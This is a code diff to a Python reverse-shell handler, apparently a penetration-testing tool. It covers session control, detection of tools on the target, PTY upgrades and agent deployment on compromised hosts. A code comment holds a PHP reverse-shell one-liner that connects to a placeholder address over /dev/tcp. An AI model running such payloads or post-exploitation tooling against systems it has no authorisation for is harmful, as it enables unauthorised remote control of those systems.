@@ -944,7 +944,7 @@ class Core:
 				self.sessionID += 1
 				return self.sessionID
 		else:
-			raise AttributeError
+			raise AttributeError(name)
 
 	@property
 	def threads(self):
@@ -1314,6 +1314,7 @@ class Session:
 		self.subtype = None
 		self.interactive = None
 		self.echoing = None
+		self.reverse_pty = None
 
 		self.version = None
 		self.user = None
@@ -1349,6 +1350,9 @@ class Session:
 		self._tmp = None
 		self._cwd = None
 		self._bsd = None
+		self._tty = None
+
+		self.bypass_control_session = False
 
 		self.id = core.new_sessionID
 		logger.debug(f"Assigned session ID: {self.id}")
@@ -1445,7 +1449,7 @@ class Session:
 
 				return self.streams[_stream_ID_hex]
 		else:
-			raise AttributeError
+			raise AttributeError(name)
 
 	def fileno(self):
 		return self.socket.fileno()
@@ -1481,7 +1485,9 @@ class Session:
 			if self.agent:
 				self.shell_pid = self.exec("stdout_stream << str(shell_pid).encode()", python=True, value=True)
 			else:
-				self.shell_pid = self.exec("echo $$", bypass=True, value=True)
+				self.bypass_control_session = True
+				self.shell_pid = self.exec("echo $$", value=True)
+				self.bypass_control_session = False
 				if not (isinstance(self.shell_pid, str) and self.shell_pid.isnumeric()):
 					logger.error("Cannot get the PID of the shell. Response: {self.shell_pid}")
 					logger.error("I am killing it...")
@@ -1491,11 +1497,25 @@ class Session:
 			self.shell_pid = None #TODO
 
 	@property
+	def tty(self):
+		if self._tty is None:
+			try:
+				self.bypass_control_session = True
+				self._tty = self.exec(f"readlink -f /proc/{self.shell_pid}/fd/0", value=True) # TODO check binary
+				self.bypass_control_session = False
+			except:
+				pass
+		return self._tty
+
+	@property
 	def bsd(self):
 		if self._bsd is None:
 			if self.OS == 'Unix':
-				response = self.control_session.exec("uname -s", value=True)
-				self._bsd = bool(re.search(r"(BSD|Darwin)", response))
+				try:
+					response = self.control_session.exec("uname -s", value=True)
+					self._bsd = bool(re.search(r"(BSD|Darwin)", response))
+				except:
+					pass
 			elif self.OS == 'Windows':
 				self._bsd = False
 		return self._bsd
@@ -1535,33 +1555,36 @@ class Session:
 	@property
 	def bin(self):
 		if not self._bin:
-			if self.OS == "Unix":
-				binaries = [
-					"sh", "bash", "python", "python3",
-					"script", "socat", "stty", "echo", "base64", "wget",
-					"curl", "tar", "rm", "stty", "nohup", "find"
-				]
-				response = self.exec(f'for i in {" ".join(binaries)}; do which $i 2>/dev/null || echo;done')
-				if response:
-					self._bin = dict(zip(binaries, response.decode().splitlines()))
-
-				missing = [b for b in binaries if not self._bin[b].startswith("/")]
-
-				if missing:
-					logger.debug(paint(f"We didn't find the binaries: {missing}. Trying another method").red)
-					response = self.exec(
-						f'for bin in {" ".join(missing)}; do for dir in '
-						f'{" ".join(LINUX_PATH.split(":"))}; do _bin=$dir/$bin; ' # TODO PATH
-						'test -f $_bin && break || unset _bin; done; echo $_bin; done'
-					)
+			try:
+				if self.OS == "Unix":
+					binaries = [
+						"sh", "bash", "python", "python3",
+						"script", "socat", "stty", "echo", "base64", "wget",
+						"curl", "tar", "rm", "stty", "nohup", "find"
+					]
+					response = self.exec(f'for i in {" ".join(binaries)}; do which $i 2>/dev/null || echo;done')
 					if response:
-						self._bin.update(dict(zip(missing, response.decode().splitlines())))
+						self._bin = dict(zip(binaries, response.decode().splitlines()))
 
-			for binary in options.no_bins:
-				self._bin[binary] = None
+					missing = [b for b in binaries if not self._bin[b].startswith("/")]
 
-			result = "\n".join([f"{b}: {self._bin[b]}" for b in binaries])
-			logger.debug(f"Available binaries on target: \n{paint(result).red}")
+					if missing:
+						logger.debug(paint(f"We didn't find the binaries: {missing}. Trying another method").red)
+						response = self.exec(
+							f'for bin in {" ".join(missing)}; do for dir in '
+							f'{" ".join(LINUX_PATH.split(":"))}; do _bin=$dir/$bin; ' # TODO PATH
+							'test -f $_bin && break || unset _bin; done; echo $_bin; done'
+						)
+						if response:
+							self._bin.update(dict(zip(missing, response.decode().splitlines())))
+
+				for binary in options.no_bins:
+					self._bin[binary] = None
+
+				result = "\n".join([f"{b}: {self._bin[b]}" for b in binaries])
+				logger.debug(f"Available binaries on target: \n{paint(result).red}")
+			except:
+				pass
 
 		return self._bin
 
@@ -1724,6 +1747,8 @@ class Session:
 
 			elif b'/dev/pts/' in response:
 				self.type =	'PTY'
+				self.reverse_pty = True
+				self._tty = re.search(rb'/dev/pts/\d*', response)[0].decode()
 
 			return True
 
@@ -1744,7 +1769,6 @@ class Session:
 		value=False,		# Will use the output elsewhere?
 		timeout=False,		# Timeout
 		expect=None,		# Items to wait for in the response
-		bypass=False,		# Control session usage
 		preserve_dir=False,	# Current dir preservation when using control session
 		separate=False,		# If true, send cmd via this method but receive with TLV method (agent)
 					# --- Agent only args ---
@@ -1874,7 +1898,7 @@ class Session:
 			return None
 
 		with self.lock:
-			if self.need_control_session and not bypass:
+			if self.need_control_session and not self.bypass_control_session:
 				if preserve_dir:
 					self.control_session.exec(f"cd {self.cwd}")
 				args = locals()
@@ -1900,6 +1924,7 @@ class Session:
 
 				if raw:
 					if self.OS == 'Unix':
+						echoed_cmd_regex = rb' ' + re.escape(cmd) + rb'\r?\n'
 						cmd = b' ' + cmd + b'\n'
 
 					elif self.OS == 'Windows':
@@ -1989,8 +2014,8 @@ class Session:
 
 					if raw and self.echoing and cmd:
 						result = buffer.getvalue()
-						if re.search(re.escape(cmd) + (b'.' if self.interactive else b''), result, re.DOTALL):
-							self.subchannel.result = result.replace(cmd, b'')
+						if re.search(echoed_cmd_regex + (b'.' if self.interactive else b''), result, re.DOTALL):
+							self.subchannel.result = re.sub(echoed_cmd_regex, b'', result)
 							break
 						else:
 							logger.debug("The echoable is not exhausted")
@@ -2026,10 +2051,12 @@ class Session:
 			self.subchannel.active = False
 
 			if separate and self.subchannel.result:
+				self.subchannel.result = re.search(rb"..\x01.*", self.subchannel.result, re.DOTALL)[0]
 				buffer = io.BytesIO()
 				for _type, _value in self.messenger.feed(self.subchannel.result):
 					buffer.write(_value)
 				return buffer.getvalue()
+
 
 			return self.subchannel.result
 
@@ -2078,15 +2105,26 @@ class Session:
 	def upgrade(self):
 
 		if self.type == 'PTY':
-			logger.warning("The shell is already PTY...")
-			return False
-
-		logger.info("Attempting to upgrade shell to PTY...")
+			if self.agent:
+				logger.warning("The shell is already PTY...")
+				return False
+			else:
+				self.bypass_control_session = True
+				deploy_agent = self.bin['python3'] or self.bin['python']
+				self.bypass_control_session = False
+				if deploy_agent:
+					logger.info("Attempting to deploy agent...")
+				else:
+					return False
+		else:
+			logger.info("Attempting to upgrade shell to PTY...")
 
 		if self.OS == "Unix":
 			deploy_agent = False
 
+			self.bypass_control_session = True
 			self.shell = self.bin['bash'] if self.bin['bash'] else self.bin['sh']
+			self.bypass_control_session = False
 			if not self.shell:
 				logger.warning("Cannot detect shell. Abort upgrading...")
 				return False
@@ -2158,17 +2196,26 @@ class Session:
 
 				return False
 
-			# Some shells are unstable in interactive mode
-			# For example: <?php passthru("bash -i >& /dev/tcp/X.X.X.X/4444 0>&1"); ?>
-			# Silently convert the shell to non-interactive before PTY upgrade.
-			if self.interactive:
+			if self.reverse_pty:
+				self.bypass_control_session = True
+				self.exec("stty -echo")
+				self.echoing = False
+				self.bypass_control_session = False
+
+			elif self.interactive:
+				# Some shells are unstable in interactive mode
+				# For example: <?php passthru("bash -i >& /dev/tcp/X.X.X.X/4444 0>&1"); ?>
+				# Silently convert the shell to non-interactive before PTY upgrade.
 				self.interactive = False
 				self.echoing = True
 				self.exec(f"exec nohup {self.shell}", raw=True)
 				self.echoing = False
 
-			response = self.exec(f'export TERM=xterm-256color; export SHELL={self.shell}; {cmd}', separate=deploy_agent, raw=True)
-			if not response:
+			self.bypass_control_session = True
+			expect = (b"\x01",) if deploy_agent else None
+			response = self.exec(f'export TERM=xterm-256color; export SHELL={self.shell}; {cmd}', separate=deploy_agent, expect=expect, raw=True)
+			self.bypass_control_session = False
+			if not isinstance(response, bytes):
 				logger.error("The shell became unresponsive. I am killing it...")
 				self.kill()
 				return False
@@ -2183,8 +2230,6 @@ class Session:
 			self.agent = 		deploy_agent
 
 			self.get_shell_pid()
-			if not self.agent: # TODO check for the binaries
-				self.tty = self.exec(f"readlink -f /proc/{self.shell_pid}/fd/0", bypass=True, value=True)
 
 		elif self.OS == "Windows":
 			logger.warning("Upgrading Windows shell is not implemented yet.")
@@ -2199,8 +2244,6 @@ class Session:
 
 		elif self.OS == 'Unix':
 			threading.Thread(target=self.exec, args=(f"stty rows {lines} columns {columns} -F {self.tty}",), name="RESIZE").start() #TEMP
-			# TODO it needs a separate thread because there are sync issues
-			#self.exec(f"stty rows {lines} columns {columns} -F {self.tty}")
 
 	def attach(self):
 
@@ -2208,8 +2251,23 @@ class Session:
 			if self.new:
 				self.new = False
 
-				if not options.no_upgrade and not self.type == 'PTY':
+				if not options.no_upgrade and (not self.type == 'PTY' or not (self.reverse_pty and self.agent)):
 					self.upgrade()
+				elif options.no_upgrade and self.type == 'PTY':
+					logger.warning("Agent is not deployed. I need to maintain at least one basic session...")
+					core.session_wait_host = self.name
+					self.bypass_control_session = True
+					self.spawn()
+					self.shell = self.bin['bash'] if self.bin['bash'] else self.bin['sh']
+					self.exec(f'export TERM=xterm-256color; export SHELL={self.shell}', raw=True)
+					self.get_shell_pid()
+					self.bypass_control_session = False
+					try:
+						new_session = core.sessions[core.session_wait.get(timeout=options.short_timeout)]
+						core.session_wait_host = None
+					except queue.Empty:
+						logger.error("Failed spawning new session")
+						return False
 
 				if self.prompt:
 					self.record(self.prompt)
@@ -3115,6 +3173,10 @@ def agent():
 	shell_pid, master_fd = pty.fork()
 	if shell_pid == pty.CHILD:
 		os.execl(SHELL, SHELL, '-i') # TEMP # TODO
+	try:
+		pty.setraw(pty.STDIN_FILENO)
+	except:
+		pass
 
 	try:
 		tasks = dict()
